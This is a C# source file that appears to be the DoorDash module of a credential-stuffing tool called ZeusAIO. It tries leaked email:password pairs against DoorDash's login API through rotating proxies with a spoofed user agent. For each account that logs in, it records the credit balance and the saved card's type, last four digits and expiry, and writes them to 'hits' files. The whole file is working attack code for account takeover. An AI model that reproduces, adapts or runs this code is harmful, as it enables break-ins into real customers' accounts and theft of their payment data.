using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Leaf.xNet;
using System.Text.RegularExpressions;
using Console = Colorful.Console;
using System.Drawing;
using Valorant;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using ZeusAIO;
using TunnelBear;
using System.Data;

namespace Doordash
{
    class Check
    {
        public static bool CheckAccount(string[] s, string proxy)
        {
            for (int i = 0; i < Config.config.Retries + 1; i++)
                while (true)
                    try
                    {
                    Retry:
                        using (HttpRequest httpRequest = new HttpRequest())
                        {
                            proxy = ZeusAIO.mainmenu.proxies.ElementAt(new Random().Next(ZeusAIO.mainmenu.proxiesCount));
                            if (ZeusAIO.mainmenu.proxyProtocol == "HTTP")
                            {
                                httpRequest.Proxy = HttpProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS4")
                            {
                                httpRequest.Proxy = Socks4ProxyClient.Parse(proxy);
                            }
                            if (ZeusAIO.mainmenu.proxyProtocol == "SOCKS5")
                            {
                                httpRequest.Proxy = Socks5ProxyClient.Parse(proxy);
                            }
                            httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36";
                            httpRequest.IgnoreProtocolErrors = true;
                            httpRequest.AllowAutoRedirect = true;
                            string str = "email=" + s[0] + "&password=" + s[1];
                            httpRequest.SslCertificateValidatorCallback = (RemoteCertificateValidationCallback)Delegate.Combine(httpRequest.SslCertificateValidatorCallback,
                            new RemoteCertificateValidationCallback((object obj, X509Certificate cert, X509Chain ssl, SslPolicyErrors error) => (cert as X509Certificate2).Verify()));
                            string text2 = httpRequest.Post("https://api.doordash.com/v2/auth/web_login/", str, "application/x-www-form-urlencoded").ToString();

                            if (text2.Contains("Incorrect username or password"))
                            {
                                break;
                            }
                            else if (text2.Contains("last_name"))
                            {
                                if (text2.Contains("account_credits\":0"))
                                {
                                    ZeusAIO.mainmenu.frees++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[FREE - DOORDASH] " + s[0] + ":" + s[1] + " | Balance: 0.00", Color.OrangeRed);
                                    }
                                    Export.AsResult("/Doordash_frees", s[0] + ":" + s[1] + " | Balance: 0.00");
                                    return false;
                                }
                                else
                                {
                                    double dick = double.Parse(Regex.Match(text2, "account_credits\":(.*?),").Groups[1].Value);
                                    string card = Check.Parse(text2, "\",\"type\":\"", "\",");
                                    string expy = Check.Parse(text2, "exp_year\":\"", "\",");
                                    string expm = Check.Parse(text2, "exp_month\":\"", "\",");
                                    string last4 = Check.Parse(text2, "last4\":\"", "\",");
                                    double bal2 = dick / 100;
                                    string captures = (" | Balance: " + "$" + bal2 + " | CC: " + card + "|" + last4 + "|" + expm + "/" + expy);
                                    string Balance = Check.Parse(text2, "\"account_credits\":", ",");
                                    ZeusAIO.mainmenu.hits++;
                                    if (Config.config.LogorCui == "2")
                                    {
                                        Console.WriteLine("[HIT - DOORDASH] " + s[0] + ":" + s[1] + captures, Color.Green);
                                    }
                                    Export.AsResult("/Doordash_hits", s[0] + ":" + s[1] + captures);
                                    return false;
                                }


                            }
                            else
                            {
                                ZeusAIO.mainmenu.realretries++;
                                goto Retry;
                            }

                        }
                    }
                    catch (Exception ex)
                    {
                        ZeusAIO.mainmenu.errors++;
                    }
            return false;
        }
        private static string Parse(string source, string left, string right)
        {
            return source.Split(new string[1] { left }, StringSplitOptions.None)[1].Split(new string[1]
            {
                right
            }, StringSplitOptions.None)[0];
        }
    }
}
